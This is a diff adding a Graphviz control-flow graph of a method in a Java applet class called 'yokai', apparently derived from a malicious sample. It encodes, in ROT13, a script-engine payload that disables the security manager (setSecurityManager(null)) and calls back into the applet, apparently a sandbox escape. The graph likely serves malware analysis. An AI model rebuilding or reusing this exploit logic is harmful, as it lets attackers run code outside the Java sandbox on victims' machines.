@@ -1,0 +1,61 @@
+digraph "" {
+    "r0 := @this: yokai"
+    "load.r r0"
+    "r0 := @this: yokai"->"load.r r0";
+    "new javax.swing.JList"
+    "load.r r0"->"new javax.swing.JList";
+    "dup1.r"
+    "new javax.swing.JList"->"dup1.r";
+    "push 1"
+    "dup1.r"->"push 1";
+    "newarray"
+    "push 1"->"newarray";
+    "newarray"->"dup1.r";
+    "push 0"
+    "dup1.r"->"push 0";
+    "new javax.script.ScriptEngineManager"
+    "push 0"->"new javax.script.ScriptEngineManager";
+    "new javax.script.ScriptEngineManager"->"dup1.r";
+    "specialinvoke <javax.script.ScriptEngineManager: void <init>()>"
+    "dup1.r"->"specialinvoke <javax.script.ScriptEngineManager: void <init>()>";
+    "push \"wf\""
+    "specialinvoke <javax.script.ScriptEngineManager: void <init>()>"->"push \"wf\"";
+    "staticinvoke <yokai: java.lang.String convert(java.lang.String)>"
+    "push \"wf\""->"staticinvoke <yokai: java.lang.String convert(java.lang.String)>";
+    "virtualinvoke <javax.script.ScriptEngineManager: javax.script.ScriptEngine getEngineByName(java.lang.String)>"
+    "staticinvoke <yokai: java.lang.String convert(java.lang.String)>"->"virtualinvoke <javax.script.ScriptEngineManager: javax.script.ScriptEngine getEngineByName(java.lang.String)>";
+    "virtualinvoke <javax.script.ScriptEngineManager: javax.script.ScriptEngine getEngineByName(java.lang.String)>"->"dup1.r";
+    "interfaceinvoke <javax.script.ScriptEngine: javax.script.Bindings createBindings()> 0"
+    "dup1.r"->"interfaceinvoke <javax.script.ScriptEngine: javax.script.Bindings createBindings()> 0";
+    "store.r r1"
+    "interfaceinvoke <javax.script.ScriptEngine: javax.script.Bindings createBindings()> 0"->"store.r r1";
+    "load.r r1"
+    "store.r r1"->"load.r r1";
+    "push \"nccyrg\""
+    "load.r r1"->"push \"nccyrg\"";
+    "push \"nccyrg\""->"staticinvoke <yokai: java.lang.String convert(java.lang.String)>";
+    "staticinvoke <yokai: java.lang.String convert(java.lang.String)>"->"load.r r0";
+    "interfaceinvoke <javax.script.Bindings: java.lang.Object put(java.lang.String,java.lang.Object)> 2"
+    "load.r r0"->"interfaceinvoke <javax.script.Bindings: java.lang.Object put(java.lang.String,java.lang.Object)> 2";
+    "pop"
+    "interfaceinvoke <javax.script.Bindings: java.lang.Object put(java.lang.String,java.lang.Object)> 2"->"pop";
+    "push \"guvf.gbFgevat = shapgvba() { wnin.ynat.Flfgrz.frgFrphevglZnantre(ahyy); nccyrg.pnyyOnpx();\terghea \'frkbpbzevabprebagrf\'; };p = arj Reebe(); p.zrffntr = guvf; p\""
+    "pop"->"push \"guvf.gbFgevat = shapgvba() { wnin.ynat.Flfgrz.frgFrphevglZnantre(ahyy); nccyrg.pnyyOnpx();\terghea \'frkbpbzevabprebagrf\'; };p = arj Reebe(); p.zrffntr = guvf; p\"";
+    "push \"guvf.gbFgevat = shapgvba() { wnin.ynat.Flfgrz.frgFrphevglZnantre(ahyy); nccyrg.pnyyOnpx();\terghea \'frkbpbzevabprebagrf\'; };p = arj Reebe(); p.zrffntr = guvf; p\""->"staticinvoke <yokai: java.lang.String convert(java.lang.String)>";
+    "staticinvoke <yokai: java.lang.String convert(java.lang.String)>"->"load.r r1";
+    "interfaceinvoke <javax.script.ScriptEngine: java.lang.Object eval(java.lang.String,javax.script.Bindings)> 2"
+    "load.r r1"->"interfaceinvoke <javax.script.ScriptEngine: java.lang.Object eval(java.lang.String,javax.script.Bindings)> 2";
+    "arraywrite.r"
+    "interfaceinvoke <javax.script.ScriptEngine: java.lang.Object eval(java.lang.String,javax.script.Bindings)> 2"->"arraywrite.r";
+    "specialinvoke <javax.swing.JList: void <init>(java.lang.Object[])>"
+    "arraywrite.r"->"specialinvoke <javax.swing.JList: void <init>(java.lang.Object[])>";
+    "virtualinvoke <yokai: java.awt.Component add(java.awt.Component)>"
+    "specialinvoke <javax.swing.JList: void <init>(java.lang.Object[])>"->"virtualinvoke <yokai: java.awt.Component add(java.awt.Component)>";
+    "virtualinvoke <yokai: java.awt.Component add(java.awt.Component)>"->"pop";
+    "goto return"
+    "pop"->"goto return";
+    "return"
+    "goto return"->"return";
+    "virtualinvoke <javax.script.ScriptException: void printStackTrace()>"
+    "virtualinvoke <yokai: java.awt.Component add(java.awt.Component)>"->"virtualinvoke <javax.script.ScriptException: void printStackTrace()>";
+}
